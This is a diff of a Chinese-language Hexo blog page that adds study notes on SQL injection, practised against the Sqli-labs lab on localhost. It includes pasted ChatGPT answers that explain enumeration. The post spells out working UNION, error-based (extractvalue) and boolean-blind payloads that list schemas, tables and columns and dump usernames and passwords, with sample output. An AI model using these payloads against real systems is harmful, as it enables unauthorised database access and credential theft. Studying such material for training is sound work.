@@ -6,13 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="讲解了http协议，burp， turbo intruder插件 定义：SQL注入通过对输入点构造针对SQL语句的闭合实现预期攻击 靶场练习：Sqli-lab information scheme cancat sleep substr字符截断，报错注入的输出字符数量有限 union 列数一致，类型兼容 注释绕过waf 如何判断字符型还是数字型 union：  识别注入点  order by 判断">
+<meta property="og:type" content="article">
 <meta property="og:title" content="SQL Injection">
 <meta property="og:url" content="http://example.com/2025/04/11/SQL-Injection/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="讲解了http协议，burp， turbo intruder插件 定义：SQL注入通过对输入点构造针对SQL语句的闭合实现预期攻击 靶场练习：Sqli-lab information scheme cancat sleep substr字符截断，报错注入的输出字符数量有限 union 列数一致，类型兼容 注释绕过waf 如何判断字符型还是数字型 union：  识别注入点  order by 判断">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2025-04-11T14:34:33.000Z">
-<meta property="article:modified_time" content="2025-04-11T14:34:33.491Z">
+<meta property="article:modified_time" content="2025-04-12T16:33:43.902Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
     
@@ -82,8 +84,6 @@
         <li><a class="icon" aria-label="Previous post" href="/2025/04/11/Blog%E7%BE%8E%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2025/02/24/hello-world/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
@@ -110,6 +110,10 @@
 
     </div>
     
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#floor%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">floor报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E5%9F%BA%E7%A1%80%EF%BC%88MySQL%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 1. 数据库结构基础（MySQL）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-2-%E7%88%86%E5%BA%93%EF%BC%88%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 2. 爆库（列出所有数据库名）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%9E%84%E9%80%A0-payload-%E7%A4%BA%E4%BE%8B%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🧠 构造 payload 示例（布尔盲注）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-3-%E7%88%86%E8%A1%A8%EF%BC%88%E5%88%97%E5%87%BA%E6%8C%87%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 3. 爆表（列出指定数据库下的所有表名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-4-%E7%88%86%E5%AD%97%E6%AE%B5%EF%BC%88%E5%88%97%E5%87%BA%E6%9F%90%E8%A1%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 4. 爆字段（列出某表的所有字段名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%EF%BC%88%E6%9B%B4%E5%BF%AB%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 5. 报错注入方式（更快）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%88%86%E5%BA%93%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🧪 爆库：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%AA-%E7%88%86%E8%A1%A8%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">🧪 爆表：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-6-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%88%E9%A1%B5%E9%9D%A2%E6%9C%89%E5%9B%9E%E6%98%BE%E6%97%B6%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 6. 联合注入（页面有回显时）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-7-%E7%88%86%E5%AD%97%E6%AE%B5%E5%80%BC%EF%BC%88%E5%A6%82%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 7. 爆字段值（如用户名密码）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%A1%A8"><span class="toc-number"></span> <span class="toc-text">🧩 常用函数表</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A"><span class="toc-number">0.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-1"><span class="toc-number">0.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0%E7%9A%84%E9%99%90%E5%88%B6%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text">✅ 一、常见报错注入函数的限制分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-extractvalue-xml-xpath"><span class="toc-number">1.</span> <span class="toc-text">1. extractvalue(xml, xpath)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-updatexml-xml-xpath-value"><span class="toc-number">2.</span> <span class="toc-text">2. updatexml(xml, xpath, value)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-floor-rand-%E6%8A%A5%E9%94%99%E6%96%B9%E5%BC%8F%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E-MySQL-5-x%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3. floor() + rand() 报错方式（适用于 MySQL 5.x）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%8F%91%E7%94%9F%E4%BA%86%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 二、如何判断是否发生了长度截断？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%B3%95-1%EF%BC%9A%E4%B8%8D%E6%96%AD%E5%A2%9E%E9%95%BF%E9%95%BF%E5%BA%A6%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.</span> <span class="toc-text">✅ 方法 1：不断增长长度确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%B3%95-2%EF%BC%9A%E6%8A%A5%E9%94%99%E5%86%85%E5%AE%B9%E5%89%8D%E5%90%8E%E7%BC%BA%E5%A4%B1"><span class="toc-number">2.</span> <span class="toc-text">✅ 方法 2：报错内容前后缺失</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%EF%BC%88%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E4%BB%A5%E4%B8%8B%E6%8A%80%E5%B7%A7%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 三、解决办法（建议使用以下技巧）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%8F%AF%E9%80%89%E6%9B%BF%E4%BB%A3%E7%AD%96%E7%95%A5%EF%BC%88%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 四、可选替代策略（自动化工具）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9B%A0-%E7%94%A8-sqlmap-%E6%8E%A7%E5%88%B6%E6%95%B0%E6%8D%AE%E9%95%BF%E5%BA%A6%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🛠 用 sqlmap 控制数据长度：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="toc-number"></span> <span class="toc-text">✅ 五、实战建议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A-1"><span class="toc-number">0.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-2"><span class="toc-number">0.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">✅ 问题总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A5-%E9%97%AE%E9%A2%98%E7%82%B9%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">🔥 问题点：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%81%9A%E6%B3%95%EF%BC%9A%E9%99%90%E5%AE%9A%E5%BA%93%E5%90%8D-%E8%A1%A8%E5%90%8D-%E5%88%86%E6%89%B9%E8%AF%BB%E5%8F%96"><span class="toc-number"></span> <span class="toc-text">✅ 正确做法：限定库名+表名 + 分批读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81%E7%88%86%E5%87%BA%E6%9F%90%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E6%8E%A8%E8%8D%90%E5%86%99%E6%B3%95%EF%BC%89%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">✅ 一、爆出某表字段名（推荐写法）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81%E9%80%90%E8%A1%8C%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88LIMIT-%E5%88%86%E9%A1%B5%E6%96%B9%E5%BC%8F%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">✅ 二、逐行爆字段名（LIMIT 分页方式）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E5%A6%82%E6%9E%9C%E4%BB%8D%E7%84%B6%E8%B6%85%E9%95%BF%EF%BC%8C%E6%94%B9%E4%B8%BA-substr-%E6%8E%A7%E5%88%B6%E5%8D%95%E4%B8%AA%E5%AD%97%E6%AE%B5%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number"></span> <span class="toc-text">✅ 三、如果仍然超长，改为 substr() 控制单个字段名长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81%E5%AE%9E%E7%94%A8%E8%BE%85%E5%8A%A9%E4%BF%A1%E6%81%AF%EF%BC%9A%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E5%BD%93%E5%89%8D%E5%BA%93%E5%90%8D%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 四、实用辅助信息：如何知道当前库名？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%94%E3%80%81%E5%B0%8F%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">✅ 五、小结</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A-2"><span class="toc-number">0.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-3"><span class="toc-number">0.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%8C-%E5%8E%9F%E5%A7%8B%E9%94%99%E8%AF%AF-Payload"><span class="toc-number"></span> <span class="toc-text">❌ 原始错误 Payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%8C-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">❌ 存在的问题：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F%EF%BC%88%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 正确语法格式（爆数据库名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%A6%82%E6%9E%9C%E5%9B%9E%E6%98%BE%E4%B8%8D%E5%85%A8%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 如果回显不全怎么办？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%AD%97%E7%AC%A6%E8%BF%87%E9%95%BF%E6%8A%A5%E9%94%99%E6%8F%90%E7%A4%BA%EF%BC%9F"><span class="toc-number"></span> <span class="toc-text">✅ 字符过长报错提示？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%BD%93%E5%89%8D%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E7%88%86%E5%87%BA%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">✅ 快速测试当前是否成功爆出：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%85%B6%E4%BB%96%E6%8E%A8%E8%8D%90-payload%EF%BC%88%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 其他推荐 payload（报错注入常用）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%BD%93%E5%89%8D%E8%A1%A8%E5%90%8D%EF%BC%88%E5%B7%B2%E7%9F%A5%E5%BA%93%E5%90%8D%EF%BC%89%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">爆当前表名（已知库名）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D%EF%BC%88%E5%B7%B2%E7%9F%A5%E8%A1%A8%EF%BC%89%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">爆字段名（已知表）：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%82%A8%E8%AF%B4%EF%BC%9A-3"><span class="toc-number">2.0.1.</span> <span class="toc-text">您说：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#ChatGPT-%E8%AF%B4%EF%BC%9A-4"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">ChatGPT 说：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%97-%E9%97%AE%E9%A2%98%E7%8E%B0%E8%B1%A1"><span class="toc-number"></span> <span class="toc-text">❗ 问题现象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-number"></span> <span class="toc-text">✅ 原因分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-group-concat-%E6%98%AF%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E7%94%A8-LIMIT-%E6%8E%A7%E5%88%B6%E5%AE%83%E7%9A%84%E8%A1%8C%EF%BC%81"><span class="toc-number">1.</span> <span class="toc-text">⚠️ group_concat(...) 是聚合函数，不能直接用 LIMIT 控制它的行！</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%86%99%E6%B3%95%E5%AF%B9%E6%AF%94%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">✅ 正确写法对比：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE-payload-%E5%86%99%E6%B3%95%EF%BC%88%E9%80%90%E6%9D%A1%E6%9E%9A%E4%B8%BE-schema-%E5%90%8D%EF%BC%89"><span class="toc-number"></span> <span class="toc-text">✅ 正确 payload 写法（逐条枚举 schema 名）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%A4%BA%E4%BE%8B%E5%AE%8C%E6%95%B4%E4%B8%80%E6%9D%A1%EF%BC%9A"><span class="toc-number"></span> <span class="toc-text">✅ 示例完整一条：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%8F%AF%E9%80%89%E6%8A%80%E5%B7%A7%EF%BC%9A%E7%88%86%E6%89%80%E6%9C%89%E5%BA%93%E5%90%8D%E6%97%B6%E6%8E%A7%E5%88%B6%E9%95%BF%E5%BA%A6"><span class="toc-number"></span> <span class="toc-text">✅ 可选技巧：爆所有库名时控制长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%B0%8F%E6%80%BB%E7%BB%93"><span class="toc-number"></span> <span class="toc-text">✅ 小总结</span></a>
+      </div>
     
   </span>
 </div>
@@ -148,7 +152,507 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    
+    <p>讲解了http协议，burp，</p>
+<p>turbo intruder插件</p>
+<p>定义：SQL注入通过对输入点构造针对SQL语句的闭合实现预期攻击</p>
+<p>靶场练习：Sqli-lab</p>
+<p>information scheme</p>
+<p>cancat</p>
+<p>sleep</p>
+<p>substr字符截断，报错注入的输出字符数量有限</p>
+<p>union 列数一致，类型兼容</p>
+<p>注释绕过waf</p>
+<p>如何判断字符型还是数字型</p>
+<p>union：</p>
+<ul>
+<li><p>识别注入点</p>
+</li>
+<li><p>order by 判断列数</p>
+</li>
+</ul>
+<ul>
+<li><p>负数作为输入值通常不与正常的查询条件匹配（例如，ID、用户标识符等通常为正数）。这样设置可以确保 <code>UNION</code> 查询不会干扰或改变原有查询的逻辑，而是只影响到注入部分。</p>
+</li>
+<li><p><strong>简化调试过程</strong>：攻击者使用负数是为了验证查询是否成功执行。通常，负数不属于有效的记录ID或数据，因此这可以帮助攻击者确认注入是否已成功，并且后续查询能够返回预期的结果。</p>
+</li>
+</ul>
+<p>双写绕过</p>
+<p>联合注入 lab1</p>
+<p>报错注入</p>
+<p>less-5 xpath报错注入</p>
+<p>容易考的，手工：联合查询，堆叠注入，报错注入，二次注入（登陆），增删改注入，like注入</p>
+<p>宽字节，参数污染</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Createsequence/p/16963891.html">预编译SQL为什么能够防止SQL注入 - Createsequence - 博客园</a></p>
+<p><strong>参数本身被直接转义为了一串普通的字符串，我们试图“注入”的 SQL 片段完全不会生效</strong>。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8082</span><span class="operator">/</span>Less<span class="number">-1</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8082/Less-5?id=-1">http://127.0.0.1:8082/Less-5?id=-1</a>‘ and extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata limit 1,1),0x7e)) –+</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8082/Less-5?id=-1">http://127.0.0.1:8082/Less-5?id=-1</a>‘ and extractvalue(1, concat(0x7e, (select group_concat(username,password) from users where id&#x3D;2 limit 0,1), 0x7e)) –+</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">爆库 库名 无<span class="keyword">where</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8082</span><span class="operator">/</span>Less<span class="number">-1</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</span></span><br><span class="line"><span class="string">Your Password:information_schema,challenges,mysql,performance_schema,security</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表 表名 where table_scheme</span></span><br><span class="line"><span class="string">http://127.0.0.1:8082/Less-1?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="comment">--+</span></span><br><span class="line">Your Password:emails,referers,uagents,users</span><br><span class="line"></span><br><span class="line">爆字段 字段名 <span class="keyword">where</span> table_name</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8082</span><span class="operator">/</span>Less<span class="number">-1</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">Your Password:id,username,password</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆实际用户 where id</span></span><br><span class="line"><span class="string">http://127.0.0.1:8082/Less-1?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,password) <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="comment">--+</span></span><br><span class="line">Your Password:AngelinaI<span class="operator">-</span>kill<span class="operator">-</span>you</span><br></pre></td></tr></table></figure>
+
+<p>where table_scheme ; table_name</p>
+<h3 id="floor报错注入"><a href="#floor报错注入" class="headerlink" title="floor报错注入"></a>floor报错注入</h3><p>起点（种子）一旦固定，序列就完全可预测 ，<code>FLOOR(RAND(0)*2)</code> 的结果不是固定的 0,1,1，而是“前几项恰好如此”，随着调用次数增加会继续变化，但攻击者只需要“前几次内出现重复”即可达到注入利用目的。</p>
+<p>数据库的流程，爆库爆表</p>
+<h6 id="ChatGPT-说："><a href="#ChatGPT-说：" class="headerlink" title="ChatGPT 说："></a>ChatGPT 说：</h6><p>进行 SQL 注入时，<strong>爆库爆表</strong>（信息枚举）是核心步骤之一，用于逐步枚举出数据库名称、表名、字段名，进而提取敏感数据（如账号密码）。我们以下以布尔盲注为例，也补充报错注入和联合注入方式。</p>
+<hr>
+<h2 id="✅-1-数据库结构基础（MySQL）"><a href="#✅-1-数据库结构基础（MySQL）" class="headerlink" title="✅ 1. 数据库结构基础（MySQL）"></a>✅ 1. 数据库结构基础（MySQL）</h2><p>在 MySQL 中，所有数据库元信息保存在系统库：<code>information_schema</code></p>
+<p>常用的几个表：</p>
+<table>
+<thead>
+<tr>
+<th>表名</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>information_schema.schemata</code></td>
+<td>所有数据库名</td>
+</tr>
+<tr>
+<td><code>information_schema.tables</code></td>
+<td>所有表名</td>
+</tr>
+<tr>
+<td><code>information_schema.columns</code></td>
+<td>所有字段名</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="✅-2-爆库（列出所有数据库名）"><a href="#✅-2-爆库（列出所有数据库名）" class="headerlink" title="✅ 2. 爆库（列出所有数据库名）"></a>✅ 2. 爆库（列出所有数据库名）</h2><h3 id="🧠-构造-payload-示例（布尔盲注）："><a href="#🧠-构造-payload-示例（布尔盲注）：" class="headerlink" title="🧠 构造 payload 示例（布尔盲注）："></a>🧠 构造 payload 示例（布尔盲注）：</h3><p>假设注入点为：</p>
+<p>bash</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND [payload] --+</code></p>
+<p>枚举第一个数据库名的第一个字符：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)=&#39;a&#39; --+</code></p>
+<p>逐字符爆破直到匹配成功，依此枚举整个名字。再改成 <code>LIMIT 1,1</code>、<code>LIMIT 2,1</code> 继续获取下一个库。</p>
+<hr>
+<h2 id="✅-3-爆表（列出指定数据库下的所有表名）"><a href="#✅-3-爆表（列出指定数据库下的所有表名）" class="headerlink" title="✅ 3. 爆表（列出指定数据库下的所有表名）"></a>✅ 3. 爆表（列出指定数据库下的所有表名）</h2><p>已知数据库名为 <code>sqli-labs</code>，爆出其第一个表名：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema=&#39;sqli-labs&#39; LIMIT 0,1),1,1)=&#39;a&#39; --+</code></p>
+<p>同样通过暴力爆破字符逐个枚举。</p>
+<hr>
+<h2 id="✅-4-爆字段（列出某表的所有字段名）"><a href="#✅-4-爆字段（列出某表的所有字段名）" class="headerlink" title="✅ 4. 爆字段（列出某表的所有字段名）"></a>✅ 4. 爆字段（列出某表的所有字段名）</h2><p>已知表名为 <code>users</code>，列出字段名：</p>
+<p>sql</p>
+<p>复制编辑</p>
+<p><code>?id=1&#39; AND substr((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; AND table_schema=&#39;sqli-labs&#39; LIMIT 0,1),1,1)=&#39;u&#39; --+</code></p>
+<p>继续使用爆破法逐个字段名枚举。</p>
+<hr>
+<h2 id="✅-5-报错注入方式（更快）"><a href="#✅-5-报错注入方式（更快）" class="headerlink" title="✅ 5. 报错注入方式（更快）"></a>✅ 5. 报错注入方式（更快）</h2><p>如果支持报错注入（比如 <code>extractvalue()</code>），可以直接查看数据：</p>
+<h3 id="🧪-爆库："><a href="#🧪-爆库：" class="headerlink" title="🧪 爆库："></a>🧪 爆库：</h3><p>sql</p>
+<p>复制编辑</p>
